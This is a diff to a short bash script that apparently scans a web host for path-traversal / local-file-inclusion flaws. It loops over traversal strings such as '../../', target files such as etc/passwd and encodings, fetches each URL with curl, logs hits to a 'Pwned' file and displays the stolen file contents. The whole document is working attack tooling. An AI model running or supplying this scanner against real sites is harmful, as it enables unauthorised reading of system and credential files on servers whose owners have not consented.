@@ -1,7 +1,7 @@
 #!/bin/bash
 host="${1}"			# www.example.com
-port="${2}"			# 80
-path="${3}"			# /?file=
+#port="${3}"			# 80
+path="${2}"			# /?file=
 queries=./Assets/queries.txt 	# ../../
 files=./Assets/files.txt	# etc/passwd
 translations=./Assets/translations.txt
@@ -13,11 +13,14 @@ do
 		for query in $(cat $queries)
 		do
 			queryy=$(echo $query | sed $translation)
-			echo "HEAD $path$queryy$file HTTP/1.1\r\nHost: z\r\n\r\n" \
-				| netcat -w5 $host $port | grep -E '\<200\>' 
-		if [[ $? == 0 ]]; then
-		curl --include "$host$path$queryy$file"
-		fi 
+			curl --include "$host$path$queryy$file" 2> /dev/null \
+			       | grep -E '\<200\>'
+			if [[ $? == 0 ]]; then
+				echo "$host$path$queryy$file" >> ./Pwned/abc.txt
+				curl "$host$path$queryy$file" | less	
+			else
+				echo $host$path$queryy$file
+			fi 
 		done
 	done
 done
